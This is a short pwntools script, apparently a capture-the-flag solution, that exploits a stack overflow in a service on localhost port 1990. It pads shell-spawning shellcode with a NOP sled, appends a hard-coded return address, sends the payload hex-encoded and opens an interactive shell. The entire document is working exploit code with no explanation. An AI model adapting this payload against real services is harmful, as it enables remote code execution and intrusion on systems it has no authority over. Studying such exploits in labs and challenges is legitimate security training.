from pwn import *

r = remote('localhost', 1990)
context(arch='amd64')

r.recvline()
pl = asm('sub rsp, 0x100;' + shellcraft.sh()).rjust(0x78, asm('nop'))
r.sendline(pl.hex() + p64(0x7fffffffe720).hex())
r.interactive()
